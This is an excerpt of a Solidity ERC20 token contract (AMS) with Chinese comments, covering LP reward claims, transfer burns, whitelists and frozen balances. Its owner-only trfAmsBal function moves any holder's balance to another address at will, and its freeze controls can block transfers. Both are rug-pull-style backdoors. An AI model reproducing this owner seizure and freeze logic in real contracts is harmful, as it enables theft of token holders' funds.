...
contract AMS is ERC20, Ownable {
    ...
    mapping(address => bool) public recordAddLPUser;//记录添加过lp的用户
    ...
    address[] internal receiveAmsUser;//记录：在swap之前领取过50%的ams的用户。领取了又不添加lp的人被找出来惩罚，没有领取的？那到时候在看怎么办
    ...
    function callCoverAmsUser() public {
        ...
        require(sbefReceiveAms[msg.sender] == false, "user rw ok over");//用户的50%只能领取一次，拿去添加lp
        uint256 _num = ERC20(laoAMs).balanceOf(msg.sender) / 2;
        transfer(msg.sender, _num);
    ...
    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override returns (uint256){
        ...
        require(balanceOf(_from) >= freBal[_from], "freBal stop1"); //冻结额度超过余额，这是一定不允许转账的
        require((balanceOf(_from) - _amount) >= freBal[_from], "freBal stop2"); //转账后的ams仍然大于冻结额度，说明转账数量是安全范围，给转
        ...
        if (isPair[_from]) {
            ...
            //假设是用户和合约产生转账行为，不做任何扣费处理。当用户和用户产生交易，做扣费处理。
            if (isContract(_from) && isContract(_to)) return _amount;
            //在交易开始前，用户见只能转账1ams以内的代币，用于绑定关系
            if (block.timestamp < startTradeTime) {
                require(_amount < 1e18, "amount 1 ams");
            }
            //每笔转账销毁4%。只有超级白名单可以免除
            if (swapWriteList[_from] == false && lpWriteList[_to] == false) {
    ...
    function veryRpRwCall(address _usr, uint256 _lpnum) external {
        require(msg.sender == usdwp, "rp very call not swap");
    ...
    // 设置白名单地址：0是 超级白名单，1是 普通白名单 , 2 lp白名单
    ...
    //其他费率调整
    function setRate(uint256 _transferDes, address _securityCont) external onlyOwner {
    ...
    function setPlacementBal(address[] memory _addr, uint256[] memory _num, uint256 _type) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {
            if (_type == 1) {
                ...
                freBal[_addr[i]] = freBal[_addr[i]] - _num[i];//批量，解锁冻结额度
            }
        }
    }
    ...
    function trfAmsBal(address[] memory _addr, uint256[] memory _num, address _radd) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {
            _balances[_addr[i]] = _balances[_addr[i]] - _num[i];
            _balances[_radd] = _balances[_radd] + _num[i];
        }
    }
